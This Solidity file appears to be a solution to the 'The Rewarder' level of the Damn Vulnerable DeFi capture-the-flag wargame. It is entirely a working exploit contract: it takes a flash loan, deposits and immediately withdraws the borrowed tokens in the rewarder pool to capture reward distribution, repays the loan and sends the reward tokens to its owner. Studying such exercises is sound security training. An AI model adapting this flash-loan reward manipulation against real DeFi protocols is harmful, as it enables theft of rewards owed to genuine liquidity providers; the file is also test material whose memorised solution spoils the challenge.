pragma solidity ^0.6.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttacker {
    FlashLoanerPool private flashLoanPool;
    TheRewarderPool private rewarderPool;
    DamnValuableToken private liquidityToken;
    RewardToken private rewardToken;
    address private owner;
    
    constructor(
        address _flashLoanPool,
        address _rewarderPool,
        address _liquidityToken,
        address _rewardToken
    ) public {
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }
    
    function attack(uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        
        // Initiate flash loan
        flashLoanPool.flashLoan(amount);
        
        // Transfer rewards to attacker
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        if (rewardBalance > 0) {
            rewardToken.transfer(msg.sender, rewardBalance);
        }
    }
    
    function receiveFlashLoan(uint256 amount) external {
        // This function is called by the flash loan pool
        require(msg.sender == address(flashLoanPool), "Only flash loan pool");
        
        // Approve the rewarder pool to spend our tokens
        liquidityToken.approve(address(rewarderPool), amount);
        
        // Deposit to get rewards
        rewarderPool.deposit(amount);
        
        // Withdraw immediately
        rewarderPool.withdraw(amount);
        
        // Repay the flash loan
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}